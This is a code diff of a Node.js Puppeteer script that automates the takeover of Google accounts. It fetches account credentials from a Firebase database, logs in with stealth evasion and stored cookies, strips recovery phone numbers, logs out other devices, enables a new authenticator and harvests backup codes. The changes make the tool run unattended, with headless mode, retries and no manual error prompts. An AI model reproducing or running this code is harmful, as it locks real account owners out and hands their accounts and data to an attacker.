@@ -1,11 +1,10 @@
 const StealthPlugin = require('puppeteer-extra-plugin-stealth')
 const puppeteer = require('puppeteer-extra')
 const twofactor = require('node-2fa')
-const readline = require('readline')
 const axios = require('axios')
 
 
-const BASE_URL = 'https://server-9099-default-rtdb.firebaseio.com/raiyan086/1_16_5' 
+const BASE_URL = 'https://server-9099-default-rtdb.firebaseio.com/raiyan086/1_20_1' 
 
 
 let mCookie = [
@@ -124,19 +123,6 @@ let mCookie = [
     }
 ]
 
-const rl = readline.createInterface({
-    input: process.stdin,
-    output: process.stdout
-})
-  
-const askQuestion = (question) => {
-    return new Promise((resolve) => {
-      rl.question(question, (answer) => {
-        resolve(answer)
-      })
-    })
-}
-
 puppeteer.use(StealthPlugin())
 
 
@@ -145,10 +131,6 @@ startServer()
 
 async function startServer() {
     console.log('Node: ---START-SERVER---')
-
-    // let mName = await getName()
-    
-    // await delay(100000)
 
     while (true) {
         let data = await getGmailData()
@@ -168,7 +150,7 @@ async function loginWithCompleted(number, password, cookies) {
             
             let browser = await puppeteer.launch({
                 headless: false,
-                // headless: 'new',
+                headless: 'new',
                 args: [
                     '--no-sandbox',
                     '--disable-notifications',
@@ -223,7 +205,11 @@ async function loginWithCompleted(number, password, cookies) {
                 if (mRapt) {
                     if (mData.recovery) {
                         console.log('Node: [ Recovery Number: '+mData.recovery+' --- Time: '+getTime()+' ]')
-                        await waitForRemoveRecovery(page, mRapt)
+                        for (let i = 0; i < 3; i++) {
+                            if (await waitForRemoveRecovery(page, mRapt)) {
+                                break
+                            }
+                        }
                     }
 
                     let mDeviceYear = await waitForDeviceLogout(page)
@@ -543,8 +529,9 @@ async function waitForRemoveRecovery(page, mRapt) {
 
     if (!mSuccess) {
         console.log('Node: [ Recovery Number: Delete Error --- Time: '+getTime()+' ]')
-        await askQuestion('Error:')
     }
+
+    return mSuccess
 }
 
 async function waitForAccountDetails(page) {
@@ -719,6 +706,10 @@ async function waitForTwoFaActive(page, mRapt) {
     let mBackupCode = null
 
     try {
+        let url = await page.url()
+        if (url.startsWith('https://accounts.google.com/v3/signin/confirmidentifer')) {
+            return { auth:null, backup:null, error:true }
+        }
         await page.goto('https://myaccount.google.com/two-step-verification/authenticator?hl=en&rapt='+mRapt, { waitUntil: 'load', timeout: 0 })
         await delay(500)
         let newButton = 'button[class="VfPpkd-LgbsSe VfPpkd-LgbsSe-OWXEXe-INsAgc VfPpkd-LgbsSe-OWXEXe-Bz112c-M1Soyc VfPpkd-LgbsSe-OWXEXe-dgl2Hf Rj2Mlf OLiIxf PDpWxe LQeN7 wMI9H"]'
@@ -763,6 +754,10 @@ async function waitForTwoFaActive(page, mRapt) {
     } catch (error) {}
 
     try {
+        let url = await page.url()
+        if (url.startsWith('https://accounts.google.com/v3/signin/confirmidentifer')) {
+            return { auth:null, backup:null, error:true }
+        }
         await page.goto('https://myaccount.google.com/two-step-verification/backup-codes?hl=en&rapt='+mRapt, { waitUntil: 'load', timeout: 0 })
         await delay(500)
         let newButton = 'button[class="VfPpkd-LgbsSe VfPpkd-LgbsSe-OWXEXe-INsAgc VfPpkd-LgbsSe-OWXEXe-Bz112c-M1Soyc VfPpkd-LgbsSe-OWXEXe-dgl2Hf Rj2Mlf OLiIxf PDpWxe LQeN7 wMI9H"]'
@@ -798,47 +793,47 @@ async function waitForTwoFaActive(page, mRapt) {
 
     try {
         if (mBackupCode || mAuthToken) {
-            try {
-                await page.goto('https://myaccount.google.com/signinoptions/twosv?hl=en&rapt='+mRapt, { waitUntil: 'load', timeout: 0 })
-                await delay(500)
-                await waitForSelector(page, 'div[class="xIcqYe"] > div > div > button', 10)
-                await delay(500)
-                await page.click('div[class="xIcqYe"] > div > div > button')
-                await waitForSelector(page, 'button[data-mdc-dialog-action="d7k1Xe"]', 10)
-                await delay(500)
-                await page.click('button[data-mdc-dialog-action="d7k1Xe"]')
-                await waitForSelector(page, 'button[data-mdc-dialog-action="TYajJe"]', 10)
-                await delay(500)
-                await page.click('button[data-mdc-dialog-action="TYajJe"]')
-
+            for (let i = 0; i < 3; i++) {
                 try {
-                    await page.waitForResponse(async res => res)
-                } catch (error) {}
-
-                for (let i = 0; i < 20; i++) {
+                    let url = await page.url()
+                    if (url.startsWith('https://accounts.google.com/v3/signin/confirmidentifer')) {
+                        return { auth:null, backup:null, error:true }
+                    }
+                    await page.goto('https://myaccount.google.com/signinoptions/twosv?hl=en&rapt='+mRapt, { waitUntil: 'load', timeout: 0 })
+                    await delay(500)
+                    await waitForSelector(page, 'div[class="xIcqYe"] > div > div > button', 5)
+                    await delay(500)
+                    await page.click('div[class="xIcqYe"] > div > div > button')
+                    await waitForSelector(page, 'button[data-mdc-dialog-action="d7k1Xe"]', 5)
+                    await delay(500)
+                    await page.click('button[data-mdc-dialog-action="d7k1Xe"]')
+                    await waitForSelector(page, 'button[data-mdc-dialog-action="TYajJe"]', 5)
+                    await delay(500)
+                    await page.click('button[data-mdc-dialog-action="TYajJe"]')
+    
                     try {
-                        if (await exists(page, 'button[class="VfPpkd-LgbsSe VfPpkd-LgbsSe-OWXEXe-INsAgc VfPpkd-LgbsSe-OWXEXe-dgl2Hf Rj2Mlf OLiIxf PDpWxe P62QJc LQeN7 wMI9H"]')) {
-                            break
-                        } else if (await exists(page, 'div[class="VfPpkd-T0kwCb"]')) {
-                            if (!await exists(page, 'div[class="VfPpkd-T0kwCb"] > button')) {
-                                break
-                            }
-                        }
+                        await page.waitForResponse(async res => res)
                     } catch (error) {}
-                }
-
-                await delay(1500)
-
-                return { auth:mAuthToken, backup:mBackupCode, error:false }
-            } catch (error) {
-                console.log(error);
-                await askQuestion('Error:')
-                return { auth:mAuthToken, backup:mBackupCode, error:true }
+    
+                    for (let i = 0; i < 20; i++) {
+                        try {
+                            if (await exists(page, 'button[class="VfPpkd-LgbsSe VfPpkd-LgbsSe-OWXEXe-INsAgc VfPpkd-LgbsSe-OWXEXe-dgl2Hf Rj2Mlf OLiIxf PDpWxe P62QJc LQeN7 wMI9H"]')) {
+                                break
+                            } else if (await exists(page, 'div[class="VfPpkd-T0kwCb"]')) {
+                                if (!await exists(page, 'div[class="VfPpkd-T0kwCb"] > button')) {
+                                    break
+                                }
+                            }
+                        } catch (error) {}
+                    }
+    
+                    await delay(1500)
+    
+                    return { auth:mAuthToken, backup:mBackupCode, error:false }
+                } catch (error) {}
             }
         }
     } catch (error) {}
-
-    await askQuestion('Error:')
 
     return { auth:null, backup:null, error:true }
 }
